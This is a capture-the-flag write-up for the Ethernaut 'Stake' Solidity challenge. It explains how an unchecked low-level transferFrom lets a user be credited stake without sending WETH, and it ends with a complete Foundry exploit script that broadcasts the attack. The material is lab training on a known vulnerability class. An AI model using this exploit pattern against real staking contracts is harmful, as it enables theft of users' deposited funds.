---
title: "Ethernaut 31 Stake"
description: "Ethernaut 31 Stake writeup"
---

## Challenge
### Prompt
Stake is safe for staking native ETH and ERC20 WETH, considering the same 1:1 value of the tokens.
Can you drain the contract?
To complete this level, the contract state must meet the following conditions:
The Stake contract's ETH balance has to be greater than 0.
totalStaked must be greater than the Stake contract's ETH balance.
You must be a staker.
Your staked balance must be 0.
Things that might be useful:
ERC-20 specification.
OpenZeppelin contracts
### Code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
contract Stake {

    uint256 public totalStaked;
    mapping(address => uint256) public UserStake;
    mapping(address => bool) public Stakers;
    address public WETH;

    constructor(address _weth) payable{
        totalStaked += msg.value;
        WETH = _weth;
    }

    function StakeETH() public payable {
        require(msg.value > 0.001 ether, "Don't be cheap");
        totalStaked += msg.value;
        UserStake[msg.sender] += msg.value;
        Stakers[msg.sender] = true;
    }
    function StakeWETH(uint256 amount) public returns (bool){
        require(amount >  0.001 ether, "Don't be cheap");
        (,bytes memory allowance) = WETH.call(abi.encodeWithSelector(0xdd62ed3e, msg.sender,address(this)));
        require(bytesToUint(allowance) >= amount,"How am I moving the funds honey?");
        totalStaked += amount;
        UserStake[msg.sender] += amount;
        (bool transfered, ) = WETH.call(abi.encodeWithSelector(0x23b872dd, msg.sender,address(this),amount));
        Stakers[msg.sender] = true;
        return transfered;
    }

    function Unstake(uint256 amount) public returns (bool){
        require(UserStake[msg.sender] >= amount,"Don't be greedy");
        UserStake[msg.sender] -= amount;
        totalStaked -= amount;
        (bool success, ) = payable(msg.sender).call{value : amount}("");
        return success;
    }
    function bytesToUint(bytes memory data) internal pure returns (uint256) {
        require(data.length >= 32, "Data length must be at least 32 bytes");
        uint256 result;
        assembly {
            result := mload(add(data, 0x20))
        }
        return result;
    }
}
```
## Background

---

In ERC20, `approve(spender, amount)` is the function that allows `spender` to take up to `amount` of my tokens. This value can be queried with `allowance(owner, spender)`.
When `spender` then calls `transferFrom(owner, to, amount)`, it moves `owner`'s tokens to `to`. However, even if the `allowance` is sufficient, `transferFrom` fails if `owner`'s actual token balance is insufficient.
`allowance` is permission, and the actual balance is a separate condition.

---

In Solidity, a normal interface call reverts the current transaction too if the target function reverts. A low-level `call`, on the other hand, returns whether the call succeeded as a `bool`.
```solidity
(bool success, bytes memory data) = target.call(payload);
```
Here, even if `success == false`, the current function keeps running unless you explicitly `require(success)`. So when using a low-level `call`, you must always check the returned `success`.
`StakeWETH` does not roll back the already-incremented `totalStaked` and `UserStake` even if `transferFrom` fails.
## Challenge code analysis

---

There are four completion conditions.
1. `address(Stake).balance > 0`
2. `totalStaked > address(Stake).balance`
3. `Stakers[msg.sender] == true`
4. `UserStake[msg.sender] == 0`

On the surface it looks like you have to drain all of the contract's ETH, but the actual check requires the ETH balance to be greater than 0. In the end, even 1 wei has to remain in the Stake contract.

---

`StakeETH` handles the ETH balance as follows:
```solidity
function StakeETH() public payable {
    require(msg.value > 0.001 ether, "Don't be cheap");
    totalStaked += msg.value;
    UserStake[msg.sender] += msg.value;
    Stakers[msg.sender] = true;
}
```
`StakeETH` receives real ETH, so `address(Stake).balance` and `totalStaked` increase together. Using only this function, you cannot create a gap between `totalStaked` and the ETH balance.
But because of the last condition, some ETH must remain inside the Stake contract. If I deposit this ETH from my own address, `UserStake[msg.sender]` also increases and I have to bring it back to 0 later. So if I deposit the ETH from a separate `tmp` contract address, I can secure the Stake contract's ETH balance without affecting my address's `UserStake`.

---

Next is the order of state updates in `StakeWETH`.
```solidity
function StakeWETH(uint256 amount) public returns (bool){
    require(amount >  0.001 ether, "Don't be cheap");
    (,bytes memory allowance) = WETH.call(abi.encodeWithSelector(0xdd62ed3e, msg.sender,address(this)));
    require(bytesToUint(allowance) >= amount,"How am I moving the funds honey?");
    totalStaked += amount;
    UserStake[msg.sender] += amount;
    (bool transfered, ) = WETH.call(abi.encodeWithSelector(0x23b872dd, msg.sender,address(this),amount));
    Stakers[msg.sender] = true;
    return transfered;
}
```
`0xdd62ed3e` is the selector for `allowance(address,address)`. So this code queries `allowance(msg.sender, address(this))` with a low-level call.
```solidity
WETH.call(abi.encodeWithSelector(0xdd62ed3e, msg.sender, address(this)))
```
Then it only checks `bytesToUint(allowance) >= amount`. What is checked here is not the actual WETH balance, but the allowance I granted to the Stake contract.
The problem is the order that follows.
```solidity
totalStaked += amount;
UserStake[msg.sender] += amount;
(bool transfered, ) = WETH.call(abi.encodeWithSelector(0x23b872dd, msg.sender,address(this),amount));
Stakers[msg.sender] = true;
return transfered;
```
It increments `totalStaked` and `UserStake` first, and then calls `transferFrom`. `0x23b872dd` is the selector for `transferFrom(address,address,uint256)`.
If my WETH balance is insufficient, `transferFrom` fails. But since it is a low-level `call`, this only makes `transfered == false`, and the function does not revert. On top of that, `transfered` is not checked with `require`.
Even if no WETH actually moves, the following state is produced.
1. `totalStaked += amount`
2. `UserStake[msg.sender] += amount`
3. `Stakers[msg.sender] = true`
4. The Stake contract's ETH balance is unchanged

In other words, I can make `totalStaked` larger than the actual ETH balance.

---

The last piece is `Unstake` and the leftover `Stakers` state.
```solidity
function Unstake(uint256 amount) public returns (bool){
    require(UserStake[msg.sender] >= amount,"Don't be greedy");
    UserStake[msg.sender] -= amount;
    totalStaked -= amount;
    (bool success, ) = payable(msg.sender).call{value : amount}("");
    return success;
}
```
`Unstake` decreases `UserStake[msg.sender]` and `totalStaked`, then sends ETH to `msg.sender`. Here too, it only returns the ETH transfer result `success` without `require(success)`.
In this solution, I deposit `amount + 1 wei` into the Stake contract in advance, so the ETH transfer of `Unstake(amount)` succeeds. Then my `UserStake` becomes 0, and 1 wei remains in the Stake contract.
`Unstake` does not set `Stakers[msg.sender]` to `false`. So even after making `Stakers[msg.sender] = true` once with `StakeWETH` and lowering `UserStake` to 0 with `Unstake`, I still remain a staker.
## Solution
### Exploit
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";

interface IStake {
    function StakeETH() external payable;
    function StakeWETH(uint256 amount) external returns (bool);
    function Unstake(uint256 amount) external returns (bool);
    function WETH() external view returns (address);
}

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
}

contract tmp {
    constructor(address _addr) payable {
        IStake(_addr).StakeETH{value: msg.value}();
    }
}

contract Attack is Script {
    function run() external {
        uint256 p = vm.envUint("PRIVATE_KEY");
        address stakeaddr= vm.envAddress("STAKE_INSTANCE");
        IStake stake = IStake(stakeaddr);
        IERC20 weth = IERC20(stake.WETH());
        uint256 amount = 0.0011 ether;
        vm.startBroadcast(p);
        new tmp{value: amount + 1 wei}(stakeaddr);
        weth.approve(stakeaddr, amount);
        stake.StakeWETH(amount);
        stake.Unstake(amount);
        vm.stopBroadcast();
    }
}
```
![screenshot](./image-1.png)
